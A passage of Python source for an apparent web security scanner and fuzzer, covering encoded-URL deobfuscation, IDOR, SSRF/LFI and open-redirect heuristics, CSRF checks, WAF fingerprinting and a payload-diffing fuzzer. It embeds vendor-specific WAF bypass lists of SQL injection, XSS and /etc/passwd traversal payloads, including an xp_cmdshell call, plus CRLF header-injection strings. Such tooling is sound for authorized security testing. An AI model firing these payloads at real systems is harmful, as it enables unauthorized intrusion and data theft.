        obf_regex = r'(?:atob|decodeURIComponent|decodeURI|unescape)\s*\(\s*["\']([A-Za-z0-9+/=%]{4,})["\']\s*\)|["\']([A-Za-z0-9+/=]{16,}|[A-Fa-f0-9]{16,}|%[A-Fa-f0-9]{2}[A-Za-z0-9%_.+-]*)["\']'
        matches = set(re.findall(obf_regex, content))
        
        # Hex escape sequences pattern: \xHH\xHH...
        hex_escape_regex = r'((?:\\x[0-9a-fA-F]{2}){4,})'
        hex_escapes = re.findall(hex_escape_regex, content)
        
        # fromCharCode pattern: fromCharCode(97, 112, ...)
        char_code_regex = r'fromCharCode\s*\(([\d\s,]+)\)'
        char_codes = re.findall(char_code_regex, content)
        
        # Comma-separated binary-like numbers: "1010100,1101010,..."
        binary_csv_regex = r'["\']((?:[01]{7,8},)+[01]{7,8})["\']'
        binary_csvs = re.findall(binary_csv_regex, content)
        
        # Deep API/REST Endpoint Discovery
        api_discovery_regex = r'["\'](/(?:api|v[1-9]|rest|graphql|swagger|openapi)[/"\'][^"\']*)["\']'
        api_endpoints = re.findall(api_discovery_regex, content)
        for ep in set(api_endpoints):
            # Exclude very short noisy matches
            if len(ep) > 5:
                line_idx = content.find(ep)
                line_num = content[:line_idx].count('\n') + 1 if line_idx != -1 else 0
                self.findings.append({
                    'url': url,
                    'type': 'API_ENDPOINT_DISCOVERED',
                    'severity': 'INFO',
                    'description': 'Discovered a hardcoded API, GraphQL, or Swagger endpoint.',
                    'remediation': 'Ensure the endpoint requires proper authentication and is intended for client-side exposure.',
                    'match': ep,
                    'context': f"Discovered Endpoint: {ep}",
                    'line': line_num,
                    'source': source
                })
        
        sensitive_keywords = ['/api/public', '/api/', 'http://', 'https://']
        found_decoded = []

        # Helper to flag findings
        def flag_finding(original, decoded, enc_type):
            severity = 'HIGH' if '/api/public' in decoded.lower() else 'MEDIUM'
            line_idx = content.find(original)
            line_num = content[:line_idx].count('\n') + 1 if line_idx != -1 else 0
            
            self.findings.append({
                'url': url,
                'type': 'DEOBFUSCATED_SENSITIVE_URL',
                'severity': severity,
                'description': f'Found deobfuscated ({enc_type}) sensitive URL or path.',
                'remediation': 'Review the decoded path to ensure it does not expose sensitive endpoints.',
                'match': original[:50] + "..." if len(original) > 50 else original,
                'context': f"Decoded: {decoded}",
                'line': line_num,
                'source': source
            })

        # Process matches from first regex
        for m in matches:
            val = m[0] if m[0] else m[1]
            if not val: continue
            
            # Try URL Decoding
            if '%' in val:
                try:
                    decoded = urllib.parse.unquote(val)
                    if any(kw in decoded.lower() for kw in sensitive_keywords):
                        flag_finding(val, f"URL-Decoded: {decoded}", "URL")
                        continue
                except: pass

            # Try Base64
            try:
                # Basic check for Base64 validity
                if re.match(r'^[A-Za-z0-9+/=]+$', val):
                    b64_val = val + '=' * ((4 - len(val) % 4) % 4)
                    decoded = base64.b64decode(b64_val).decode('utf-8', errors='ignore')
                    if any(kw in decoded.lower() for kw in sensitive_keywords):
                        flag_finding(val, f"Base64: {decoded}", "Base64")
                        continue
            except: pass
            
            # Try Hex
            try:
                if re.match(r'^[0-9a-fA-F]{16,}$', val):
                    decoded = binascii.unhexlify(val).decode('utf-8', errors='ignore')
                    if any(kw in decoded.lower() for kw in sensitive_keywords):
                        flag_finding(val, f"Hex: {decoded}", "Hex")
                        continue
            except: pass

        # Process Hex Escapes
        for val in hex_escapes:
            try:
                decoded = "".join([chr(int(h[2:], 16)) for h in re.findall(r'\\x[0-9a-fA-F]{2}', val)])
                if any(kw in decoded.lower() for kw in sensitive_keywords):
                    flag_finding(val, f"Hex-Escape: {decoded}", "Hex-Escape")
            except: pass

        # Process fromCharCode
        for val in char_codes:
            try:
                codes = [int(c.strip()) for c in val.split(',')]
                decoded = "".join([chr(c) for c in codes])
                if any(kw in decoded.lower() for kw in sensitive_keywords):
                    flag_finding(val, f"CharCode: {decoded}", "fromCharCode")
            except: pass

        # Process Binary CSV
        for val in binary_csvs:
            try:
                parts = val.split(',')
                decoded = "".join([chr(int(p, 2)) for p in parts])
                if any(kw in decoded.lower() for kw in sensitive_keywords):
                    flag_finding(val, f"Binary-CSV: {decoded}", "Binary-CSV")
            except: pass

    def _check_sensitive_params(self, url, source='STATIC'):
        """
        Analyzes URL parameters for potential sensitive links like Open Redirect, SSRF, or LFI.
        """
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # Common parameters that accept URLs or paths
        redirect_params = ['returnurl', 'redirect', 'next', 'url', 'target', 'goto', 'return_url', 'redirect_url', 'forward', 'destination']
        ssrf_lfi_params = ['file', 'path', 'dir', 'document', 'folder', 'root', 'page', 'doc', 'load', 'read']
        
        for param, values in params.items():
            param_lower = param.lower()
            
            for value in values:
                # 1. Open Redirect
                if any(s in param_lower for s in redirect_params):
                    self.findings.append({
                        'url': url,
                        'type': 'OPEN_REDIRECT_PARAM',
                        'severity': 'MEDIUM',
                        'description': f'Potential Open Redirect parameter "{param}" detected.',
                        'remediation': 'Ensure the redirect destination is validated against an allowlist.',
                        'match': f"{param}={value}",
                        'context': url,
                        'line': 0,
                        'source': source
                    })
                
                # 2. SSRF / LFI
                if any(s == param_lower for s in ssrf_lfi_params):
                    if '/' in value or '\\' in value or value.startswith('http'):
                        self.findings.append({
                            'url': url,
                            'type': 'POTENTIAL_SSRF_LFI',
                            'severity': 'HIGH',
                            'description': f'Potential SSRF/LFI parameter "{param}" detected.',
                            'remediation': 'Validate and sanitize file paths or URLs provided in parameters.',
                            'match': f"{param}={value}",
                            'context': url,
                            'line': 0,
                            'source': source
                        })

    def _check_idor(self, url, source='STATIC'):
        """
        Analyzes URL parameters AND path for potential IDOR candidates.
        Advanced checks: Path IDs, JWTs, Base64 encoded IDs.
        """
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        suspicious_params = ['id', 'user', 'account', 'profile', 'order', 'invoice', 'report', 'doc', 'file', 'key', 'token', 'uid', 'uuid', 'pid', 'item', 'customer', 'transaction', 'member', 'group']
        
        # --- 1. Query Parameter Analysis ---
        for param, values in params.items():
            param_lower = param.lower()
            is_suspicious_name = any(s in param_lower for s in suspicious_params) or param_lower.endswith('id')
            
            for value in values:
                # A. Numeric ID
                if is_suspicious_name and value.isdigit():
                    self.findings.append({
                        'url': url,
                        'type': 'POTENTIAL_IDOR_NUMERIC',
                        'severity': 'MEDIUM',
                        'description': f'Potential IDOR (Numeric) in parameter "{param}".',
                        'remediation': 'Ensure access controls are in place. Numeric IDs are easily enumerated.',
                        'match': f"{param}={value}",
                        'context': url,
                        'line': 0,
                        'source': source
                    })
                
                # B. UUID/GUID
                elif is_suspicious_name and re.match(r'^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$', value):
                    self.findings.append({
                        'url': url,
                        'type': 'POTENTIAL_IDOR_UUID',
                        'severity': 'LOW',
                        'description': f'Potential IDOR (UUID) in parameter "{param}".',
                        'remediation': 'Verify access controls. UUIDs prevent enumeration but not unauthorized access.',
                        'match': f"{param}={value}",
                        'context': url,
                        'line': 0,
                        'source': source
                    })

                # C. JWT Detection
                if value.startswith('eyJ') and value.count('.') == 2:
                    try:
                        # Decode payload (middle part)
                        payload = value.split('.')[1]
                        # Fix padding
                        padding = len(payload) % 4
                        if padding: payload += '=' * (4 - padding)
                        
                        decoded_bytes = base64.urlsafe_b64decode(payload)
                        decoded_json = json.loads(decoded_bytes)
                        
                        # Check for ID-like fields in JWT
                        jwt_suspicious = ['sub', 'uid', 'user_id', 'id', 'email', 'account']
                        found_claims = [k for k in decoded_json.keys() if any(s in k.lower() for s in jwt_suspicious)]
                        
                        if found_claims:
                            self.findings.append({
                                'url': url,
                                'type': 'POTENTIAL_IDOR_JWT',
                                'severity': 'HIGH',
                                'description': f'JWT token found in parameter "{param}" containing user identifiers: {found_claims}.',
                                'remediation': 'Ensure the token signature is verified and not just decoded.',
                                'match': f"{param}=JWT(...)",
                                'context': f"Claims: {found_claims}",
                                'line': 0,
                                'source': source
                            })
                    except Exception:
                        pass # Not a valid JWT or JSON

                # D. Base64 Encoded ID
                elif re.match(r'^[a-zA-Z0-9+/]+={0,2}$', value) and len(value) > 1:
                    try:
                        decoded_bytes = base64.b64decode(value, validate=True)
                        decoded_str = decoded_bytes.decode('utf-8', errors='ignore')
                        
                        if decoded_str.isdigit():
                             self.findings.append({
                                'url': url,
                                'type': 'POTENTIAL_IDOR_BASE64',
                                'severity': 'MEDIUM',
                                'description': f'Base64 encoded numeric ID found in parameter "{param}".',
                                'remediation': 'Encoding is not encryption. Ensure access controls.',
                                'match': f"{param}={value} -> {decoded_str}",
                                'context': url,
                                'line': 0,
                                'source': source
                            })
                        elif decoded_str.strip().startswith('{') and decoded_str.strip().endswith('}'):
                             # JSON object?
                             try:
                                 json_obj = json.loads(decoded_str)
                                 # Check keys
                                 if any(s in k.lower() for k in json_obj.keys() for s in suspicious_params):
                                     self.findings.append({
                                        'url': url,
                                        'type': 'POTENTIAL_IDOR_BASE64_JSON',
                                        'severity': 'HIGH',
                                        'description': f'Base64 encoded JSON object with ID fields found in parameter "{param}".',
                                        'remediation': 'Do not pass access control objects via client-side parameters.',
                                        'match': f"{param}={value} -> {decoded_str}",
                                        'context': url,
                                        'line': 0,
                                        'source': source
                                    })
                             except:
                                 pass
                    except Exception:
                        pass

        # --- 2. Path-based Analysis ---
        path_segments = parsed_url.path.strip('/').split('/')
        for i, segment in enumerate(path_segments):
            # Context comes from previous segment (e.g., /users/123)
            context = path_segments[i-1].lower() if i > 0 else ""
            
            # Numeric ID in path
            if segment.isdigit() and len(segment) < 20: 
                # Heuristic: Only interesting if context is meaningful
                if context and any(s in context for s in suspicious_params):
                    self.findings.append({
                        'url': url,
                        'type': 'POTENTIAL_IDOR_PATH',
                        'severity': 'MEDIUM',
                        'description': f'Potential Path-based IDOR: Numeric ID "{segment}" found after "{context}".',
                        'remediation': 'Ensure proper access controls for RESTful resources.',
                        'match': f".../{context}/{segment}/...",
                        'context': url,
                        'line': 0,
                        'source': source
                    })
            
            # UUID in path
            elif re.match(r'^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$', segment):
                 if context and any(s in context for s in suspicious_params):
                    self.findings.append({
                        'url': url,
                        'type': 'POTENTIAL_IDOR_PATH_UUID',
                        'severity': 'LOW',
                        'description': f'Potential Path-based IDOR: UUID "{segment}" found after "{context}".',
                        'remediation': 'Verify access controls.',
                        'match': f".../{context}/{segment}/...",
                        'context': url,
                        'line': 0,
                        'source': source
                    })

    def _check_reflection(self, url, content, source='STATIC'):
        """
        Checks if any query parameters from the URL are reflected in the content.
        """
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        for param, values in params.items():
            for value in values:
                if len(value) > 3:
                    # Escape value for regex if it contains special characters
                    escaped_value = re.escape(value)
                    matches = re.finditer(escaped_value, content)
                    for match in matches:
                        snippet = content[max(0, match.start() - 50):min(len(content), match.end() + 50)]
                        finding = {
                            'url': url,
                            'type': 'REFLECTED_INPUT',
                            'severity': 'MEDIUM',
                            'description': f'Input parameter "{param}" reflected in response.',
                            'remediation': 'Sanitize and encode user inputs.',
                            'match': value,
                            'context': snippet.strip(),
                            'line': content[:match.start()].count('\n') + 1,
                            'param': param,
                        }
                        self.findings.append(finding)

    def scan_request(self, url, method='GET', headers=None, body=None, network_urls=None):
        """
        Analyzes an OUTGOING request (method/headers/body) — the counterpart to scan().
        scan() only ever sees response bodies and URL query strings; this method covers
        what scan() structurally cannot reach: POST/PUT/PATCH bodies, request headers,
        and body-encoded parameters (form-urlencoded, multipart, JSON).
        Returns a list of new finding dictionaries.
        """
        new_findings = []
        headers = headers or {}
        source = 'NETWORK_REQUEST'
        headers_lower = {k.lower(): v for k, v in headers.items()}

        # 1. Auth / session material in request headers
        auth_header_names = ['authorization', 'x-api-key', 'x-auth-token', 'x-session-token', 'cookie']
        for hname in auth_header_names:
            if hname in headers_lower and headers_lower[hname]:
                hval = headers_lower[hname]
                severity = 'INFO'
                desc = f'Request header "{hname}" sent to in-scope target.'
                if hname == 'authorization' and 'bearer' in hval.lower():
                    severity = 'MEDIUM'
                    desc = 'Bearer token observed in outgoing Authorization header.'
                elif hname == 'cookie' and any(s in hval.lower() for s in ['session', 'auth', 'token', 'sid=']):
                    severity = 'LOW'
                    desc = 'Session/auth cookie observed on outgoing request — verify Secure/HttpOnly/SameSite on Set-Cookie.'
                f = {
                    'url': url, 'method': method, 'type': 'REQUEST_AUTH_MATERIAL',
                    'severity': severity, 'description': desc,
                    'remediation': 'Ensure tokens are scoped, short-lived, and never logged; verify cookie flags.',
                    'match': f'{hname}: {hval[:80]}', 'context': f'{method} {url}', 'line': 0, 'source': source
                }
                if f not in self.findings:
                    self.findings.append(f); new_findings.append(f)

        # 2. Missing CSRF protection heuristic on state-changing requests
        if method.upper() in ('POST', 'PUT', 'PATCH', 'DELETE'):
            csrf_header_present = any(h in headers_lower for h in
                ['x-csrf-token', 'x-xsrf-token', 'csrf-token', 'x-requested-with'])
            body_has_csrf_field = bool(body) and bool(re.search(r'csrf|_token|authenticity_token', body, re.IGNORECASE))
            if not csrf_header_present and not body_has_csrf_field:
                f = {
                    'url': url, 'method': method, 'type': 'MISSING_CSRF_TOKEN',
                    'severity': 'LOW',
                    'description': f'{method} request carries no recognizable CSRF token (header or body field).',
                    'remediation': 'Confirm server-side CSRF validation (e.g. SameSite cookies, double-submit token, custom header check).',
                    'match': f'{method} {url}', 'context': 'No csrf/_token/authenticity_token field or anti-CSRF header found',
                    'line': 0, 'source': source
                }
                if f not in self.findings:
                    self.findings.append(f); new_findings.append(f)

        # 3. Parse body params (JSON / form-urlencoded) into (param, value) pairs
        body_params = []
        if body:
            stripped = body.strip()
            try:
                if stripped.startswith('{') or stripped.startswith('['):
                    parsed = json.loads(stripped)
                    body_params = list(self._flatten_json_params(parsed))
                else:
                    qs = urllib.parse.parse_qs(stripped, keep_blank_values=True)
                    body_params = [(k, v) for k, vals in qs.items() for v in vals]
            except Exception:
                pass

        suspicious_params = ['id', 'user', 'account', 'profile', 'order', 'invoice', 'report', 'doc',
                              'file', 'key', 'token', 'uid', 'uuid', 'pid', 'item', 'customer',
                              'transaction', 'member', 'group', 'role', 'admin', 'isadmin', 'is_admin']
        ssrf_lfi_params = ['file', 'path', 'dir', 'document', 'folder', 'root', 'page', 'doc', 'load', 'read', 'url']

        for param, value in body_params:
            if not isinstance(value, str):
                value = str(value)
            param_lower = param.lower()
            is_suspicious_name = any(s in param_lower for s in suspicious_params) or param_lower.endswith('id')

            # IDOR-style numeric/UUID identifiers in body
            if is_suspicious_name and value.isdigit():
                f = {
                    'url': url, 'method': method, 'type': 'POTENTIAL_IDOR_BODY_PARAM',
                    'severity': 'MEDIUM',
                    'description': f'Potential IDOR (numeric) in request body field "{param}".',
                    'remediation': 'Verify server-side authorization, not just that the field exists client-side.',
                    'match': f'{param}={value}', 'context': f'{method} {url}', 'line': 0, 'source': source
                }
                if f not in self.findings:
                    self.findings.append(f); new_findings.append(f)

            # Privilege-flag tampering candidates (role/isAdmin-style fields client can set)
            if param_lower in ('role', 'isadmin', 'is_admin', 'admin', 'permissions', 'scope'):
                f = {
                    'url': url, 'method': method, 'type': 'CLIENT_CONTROLLED_PRIVILEGE_FIELD',
                    'severity': 'HIGH',
                    'description': f'Request body includes client-settable privilege-like field "{param}".',
                    'remediation': 'Privilege/role must be derived server-side from the authenticated session, never trusted from the client.',
                    'match': f'{param}={value}', 'context': f'{method} {url}', 'line': 0, 'source': source
                }
                if f not in self.findings:
                    self.findings.append(f); new_findings.append(f)

            # SSRF/LFI-style path or URL fields in body
            if param_lower in ssrf_lfi_params and ('/' in value or '\\' in value or value.lower().startswith('http')):
                f = {
                    'url': url, 'method': method, 'type': 'POTENTIAL_SSRF_LFI_BODY_PARAM',
                    'severity': 'HIGH',
                    'description': f'Potential SSRF/LFI body field "{param}" accepts a path or URL.',
                    'remediation': 'Validate against an allowlist server-side; never resolve client-supplied URLs/paths directly.',
                    'match': f'{param}={value}', 'context': f'{method} {url}', 'line': 0, 'source': source
                }
                if f not in self.findings:
                    self.findings.append(f); new_findings.append(f)

        return new_findings

    def check_waf(self, status_code, headers, body, url):
        """
        Detects WAF vendor from response headers, cookies, and body signatures.
        Stores detected WAF in self.detected_waf. Returns a finding dict or None.
        Detects: Cloudflare, Akamai, AWS WAF, ModSecurity, Imperva, F5 BigIP.
        """
        is_blocked = False
        waf_name = None

        headers_lower = {k.lower(): v for k, v in (headers or {}).items()}
        headers_lower_vals = {k: v.lower() for k, v in headers_lower.items()}
        cookies_str = headers_lower.get('set-cookie', '')
        body_decoded = body.decode('utf-8', errors='ignore') if isinstance(body, bytes) else (body or '')
        body_str = body_decoded.lower()

        # --- Vendor Fingerprinting (regardless of status code) ---

        # 1. Cloudflare: cf-ray header
        if 'cf-ray' in headers_lower:
            waf_name = 'Cloudflare'

        # 2. Akamai: AkamaiGHost in Server or Via header, or body signature
        elif 'akamaighost' in headers_lower_vals.get('server', '') or \
             'akamaighost' in headers_lower_vals.get('via', '') or \
             ('access denied' in body_str and 'reference #' in body_str):
            waf_name = 'Akamai'

        # 3. AWS WAF: x-amzn-requestid header
        elif 'x-amzn-requestid' in headers_lower or 'x-amzn-trace-id' in headers_lower:
            waf_name = 'AWS WAF'

        # 4. ModSecurity: Mod_Security in body or Server header
        elif 'mod_security' in body_str or 'modsecurity' in body_str or \
             'mod_security' in headers_lower_vals.get('server', ''):
            waf_name = 'ModSecurity'

        # 5. Imperva: incap_ses cookie
        elif 'incap_ses' in cookies_str or 'incapsula' in cookies_str or \
             'x-iinfo' in headers_lower or 'incapsula incident id' in body_str:
            waf_name = 'Imperva'

        # 6. F5 BigIP: BIGipServer cookie
        elif 'bigipserver' in cookies_str.lower() or \
             'f5' in headers_lower_vals.get('server', '') or \
             'big-ip' in headers_lower_vals.get('server', ''):
            waf_name = 'F5 BigIP'

        # Fallback: check status + body/server for generic WAF
        elif status_code in [403, 406, 429, 503, 422]:
            if 'cloudflare' in body_str and 'ray id' in body_str:
                waf_name = 'Cloudflare'
            elif 'request blocked' in body_str or 'security policy' in body_str:
                waf_name = 'Generic WAF'
            elif 'cloudflare' in headers_lower_vals.get('server', ''):
                waf_name = 'Cloudflare'
            elif 'awselb' in headers_lower_vals.get('server', '') or \
                 'amazoncf' in headers_lower_vals.get('server', ''):
                waf_name = 'AWS WAF'

        if waf_name:
            self.detected_waf = waf_name
            is_blocked = status_code in [403, 406, 429, 503, 422]
            bypass_techniques = self.get_waf_bypass_payloads(waf_name, 'all')

            f = {
                'url': url,
                'type': 'WAF_FINGERPRINTED',
                'severity': 'INFO',
                'description': f'WAF Detected: {waf_name}. Status: {status_code}.',
                'remediation': 'Use vendor-specific bypass payloads to validate underlying vulnerabilities.',
                'match': f'{waf_name} (Status: {status_code})',
                'context': bypass_techniques,
                'line': 0,
                'source': 'NETWORK'
            }
            if f not in self.findings:
                self.findings.append(f)
            return f

        return None

    def get_waf_bypass_payloads(self, waf_name, payload_type='all'):
        """
        Returns vendor-specific WAF bypass payloads as a formatted string.
        payload_type: 'sqli', 'xss', 'lfi', 'all'
        """
        payloads = {
            'Cloudflare': {
                'sqli': [
                    "1'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
                    "1' AND 1=1--",
                    "1'%0aUNION%0aSELECT%0aNULL--",
                    "1' /*!50000UNION*/ SELECT NULL--",
                    "%27%20UNION%20SELECT%20NULL--",
                ],
                'xss': [
                    "<svg/onload=alert`1`>",
                    "<img src=x onerror=\"alert(1)\">",
                    "%3Csvg%2Fonload%3Dalert(1)%3E",
                    "<details open ontoggle=alert(1)>",
                    "javascript:/*--></title></style></textarea></script><svg/onload='/*`*/alert(1)//'>",
                ],
                'lfi': [
                    "....//....//....//etc/passwd",
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                ],
            },
            'Akamai': {
                'sqli': [
                    "1'/*! UNION *//*! SELECT */NULL--",
                    "1'%09UNION%09SELECT%09NULL--",
                    "1' UNION%0ASELECT NULL,NULL--",
                    "1'%0BUNION%0BSELECT%0BNULL--",
                ],
                'xss': [
                    "<ScRiPt>alert(1)</ScRiPt>",
                    "<img/src=x onerror=alert(1)>",
                    "';alert(1)//",
                    "<body onpageshow=alert(1)>",
                    "<iframe srcdoc='<svg onload=alert(1)>'>",
                ],
                'lfi': [
                    "..%c0%afetc%c0%afpasswd",
                    "..//..//..//etc//passwd",
                    "%2e%2e/%2e%2e/etc/passwd",
                ],
            },
            'AWS WAF': {
                'sqli': [
                    "1' OR '1'='1",
                    "1'%20OR%20'1'='1",
                    "1') OR ('1'='1",
                    "1' OR 1=1--+",
                ],
                'xss': [
                    "<svg onload=alert(1)>",
                    "<math><mtext></p><script>alert(1)</script>",
                    "<input autofocus onfocus=alert(1)>",
                ],
                'lfi': [
                    "....//....//etc/passwd",
                    "..\\..\\..\\etc\\passwd",
                    "%2e%2e%5cetc%5cpasswd",
                ],
            },
            'ModSecurity': {
                'sqli': [
                    "1' /*!UNION*/ /*!SELECT*/ NULL--",
                    "1'%20/*!50000UNION*/%20SELECT%20NULL--",
                    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "1';WAITFOR DELAY '0:0:5'--",
                ],
                'xss': [
                    "<scr\x00ipt>alert(1)</script>",
                    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">'",
                    "\"><ScRiPt>alert(1)</ScRiPt>",
                    "<a href=\"javascript:void(alert(1))\">Click</a>",
                ],
                'lfi': [
                    "..%c0%af..%c0%afetc%c0%afpasswd",
                    "/%2e%2e/%2e%2e/etc/passwd",
                    "/....//....//etc/passwd",
                ],
            },
            'Imperva': {
                'sqli': [
                    "1' OR 'unusual'='unusual",
                    "1'||'1'='1",
                    "1' AND SLEEP(5)--",
                    "1);SELECT pg_sleep(5)--",
                ],
                'xss': [
                    r"<svg><script>alert(1)<\/script>",
                    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                    "<body/onload=&Tab;alert(1)>",
                    "<iframe onload=alert(1) src=data:text/html,>",
                ],
                'lfi': [
                    "%252e%252e%252fetc%252fpasswd",
                    "..%25%32%66..%25%32%66etc%25%32%66passwd",
                    "/..%5c..%5c..%5cetc%5cpasswd",
                ],
            },
            'F5 BigIP': {
                'sqli': [
                    "1'%20UNION%20SELECT%20NULL--",
                    "1' AND 1=1 LIMIT 1--",
                    "1' OR SLEEP(5)--",
                    "'; EXEC xp_cmdshell('whoami')--",
                ],
                'xss': [
                    "<script>alert(1)</script>",
                    "<img src=1 onerror=alert(1)>",
                    "<details/open/ontoggle=alert(1)>",
                    "\";alert(1)//",
                ],
                'lfi': [
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "....//....//etc//passwd",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                ],
            },
            'Generic WAF': {
                'sqli': [
                    "1' OR '1'='1",
                    "1/**/UNION/**/SELECT/**/NULL--",
                    "1'%0AUNION%0ASELECT%0ANULL--",
                ],
                'xss': [
                    "<svg/onload=alert(1)>",
                    "<img src=x onerror=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                ],
                'lfi': [
                    "../etc/passwd",
                    "..%2fetc%2fpasswd",
                    "%252e%252e%252fetc%252fpasswd",
                ],
            },
        }

        vendor_map = payloads.get(waf_name, payloads.get('Generic WAF', {}))
        output_lines = [f"[WAF Bypass Payloads for {waf_name}]"]

        types_to_show = ['sqli', 'xss', 'lfi'] if payload_type == 'all' else [payload_type]
        for ptype in types_to_show:
            if ptype in vendor_map:
                output_lines.append(f"\n{ptype.upper()} Bypasses:")
                for p in vendor_map[ptype]:
                    output_lines.append(f"  - {p}")

        return '\n'.join(output_lines)

    # ------------------------------------------------------------------
    # FUZZER DIFF ENGINE
    # ------------------------------------------------------------------
    def baseline_fuzz(self, url, param, payloads, method='GET', headers=None, body=None):
        """
        Sends a clean baseline request then replays with each payload, comparing
        status code, response time, and body length to detect injection.

        Args:
            url     : Target URL (may already contain param in query string).
            param   : Parameter name to fuzz.
            payloads: List of payload strings to inject.
            method  : HTTP method ('GET' or 'POST').
            headers : Optional dict of extra request headers.
            body    : Optional base request body string (for POST).

        Returns: list of Finding dicts.
        """
        if _requests is None:
            return []

        findings = []
        session = _requests.Session()
        req_headers = {'User-Agent': 'VulcanX-Fuzzer/1.0'}
        if headers:
            req_headers.update(headers)

        def _inject(param_val):
            """Build request args with payload injected into param."""
            if method.upper() == 'GET':
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [param_val]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                target = urllib.parse.urlunparse(parsed._replace(query=new_query))
                return dict(url=target, params=None, data=None)
            else:
                base_body = body or ''
                stripped = base_body.strip()
                if stripped.startswith('{'):
                    try:
                        obj = json.loads(stripped)
                        obj[param] = param_val
                        return dict(url=url, params=None, data=None,
                                    json=obj)
                    except Exception:
                        pass
                qs = urllib.parse.parse_qs(stripped, keep_blank_values=True)
                qs[param] = [param_val]
                return dict(url=url, params=None,
                            data=urllib.parse.urlencode(qs, doseq=True))

        # --- Baseline ---
        try:
            baseline_args = _inject('')
            t0 = time.time()
            resp = session.request(method.upper(), headers=req_headers,
                                   timeout=15, **baseline_args)
            baseline_time = time.time() - t0
            baseline_status = resp.status_code
            baseline_len = len(resp.text)
        except Exception as e:
            findings.append({
                'url': url, 'type': 'FUZZER_ERROR', 'severity': 'INFO',
                'description': f'Baseline request failed: {e}',
                'remediation': 'Check target availability.',
                'match': param, 'context': str(e), 'line': 0, 'source': 'FUZZER'
            })
            return findings

        # --- Fuzz each payload ---
        for payload in payloads:
            try:
                fuzz_args = _inject(payload)
                t0 = time.time()
                fuzz_resp = session.request(method.upper(), headers=req_headers,
                                            timeout=20, **fuzz_args)
                elapsed = time.time() - t0
            except Exception:
                continue

            delta_time = elapsed - baseline_time
            status_changed = fuzz_resp.status_code != baseline_status
            fuzz_len = len(fuzz_resp.text)
            body_pct_change = abs(fuzz_len - baseline_len) / max(baseline_len, 1)
            payload_reflected = payload in fuzz_resp.text

            # 1. Blind Time-based Injection (>4s delay)
            if delta_time > 4.0:
                findings.append({
                    'url': url, 'type': 'BLIND_TIME_INJECTION',
                    'severity': 'HIGH',
                    'description': (
                        f'Time-based blind injection detected on param "{param}". '
                        f'Baseline: {baseline_time:.2f}s, Fuzz: {elapsed:.2f}s '
                        f'(delta +{delta_time:.2f}s).'
                    ),
                    'remediation': 'Use parameterised queries / prepared statements.',
                    'match': payload,
                    'context': f'Param={param}, Method={method}, Delta={delta_time:.2f}s',
                    'line': 0, 'source': 'FUZZER'
                })

            # 2. Status code change
            if status_changed:
                findings.append({
                    'url': url, 'type': 'FUZZ_STATUS_CHANGE',
                    'severity': 'MEDIUM',
                    'description': (
                        f'HTTP status changed on param "{param}": '
                        f'{baseline_status} -> {fuzz_resp.status_code}.'
                    ),
                    'remediation': 'Investigate why the payload triggers a different response code.',
                    'match': payload,
                    'context': f'Baseline={baseline_status}, Fuzz={fuzz_resp.status_code}',
                    'line': 0, 'source': 'FUZZER'
                })

            # 3. Significant body size change (>20%)
            if body_pct_change > 0.20 and not status_changed:
                findings.append({
                    'url': url, 'type': 'FUZZ_BODY_DIFF',
                    'severity': 'MEDIUM',
                    'description': (
                        f'Response body size changed significantly for param "{param}": '
                        f'{baseline_len} -> {fuzz_len} bytes '
                        f'({body_pct_change*100:.1f}% change).'
                    ),
                    'remediation': 'Investigate differential response; may indicate error-based injection.',
                    'match': payload,
                    'context': f'Baseline={baseline_len}B, Fuzz={fuzz_len}B',
                    'line': 0, 'source': 'FUZZER'
                })

            # 4. Payload reflection
            if payload_reflected:
                findings.append({
                    'url': url, 'type': 'FUZZ_PAYLOAD_REFLECTED',
                    'severity': 'MEDIUM',
                    'description': f'Payload reflected in response for param "{param}".',
                    'remediation': 'Sanitise and encode all user-supplied output; may indicate XSS.',
                    'match': payload,
                    'context': fuzz_resp.text[max(0, fuzz_resp.text.find(payload)-60):
                                              fuzz_resp.text.find(payload)+60+len(payload)],
                    'line': 0, 'source': 'FUZZER'
                })

        self.findings.extend(findings)
        return findings

    # ------------------------------------------------------------------
    # HEADER INJECTION FUZZER
    # ------------------------------------------------------------------
    def fuzz_headers(self, url, payloads=None):
        """
        Fuzzes a set of common HTTP request headers with CRLF/injection payloads.
        Checks for reflection in response, 5xx errors, and time delays.

        Returns: list of Finding dicts.
        """
        if _requests is None:
            return []

        default_payloads = [
            "127.0.0.1",
            "localhost",
            "\r\nX-Injected: vulcanx",
            "127.0.0.1\r\nSet-Cookie: vulcanx=1",
            "0\r\n\r\nHTTP/1.1 200 OK\r\n\r\n<html>injected</html>",
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "%0d%0aX-Injected: vulcanx",
            "../etc/passwd",
        ]
        payloads = payloads or default_payloads

        target_headers = [
            'X-Forwarded-For',
            'X-Originating-IP',
            'X-Remote-IP',
            'Referer',
            'User-Agent',
            'X-Host',
            'X-Real-IP',
        ]

        findings = []
        session = _requests.Session()

        # Baseline
        try:
            t0 = time.time()
            baseline = session.get(url, timeout=10,
                                   headers={'User-Agent': 'VulcanX-Fuzzer/1.0'})
            baseline_time = time.time() - t0
            baseline_body = baseline.text
        except Exception as e:
            findings.append({
                'url': url, 'type': 'HEADER_FUZZ_ERROR', 'severity': 'INFO',
                'description': f'Baseline request failed: {e}',
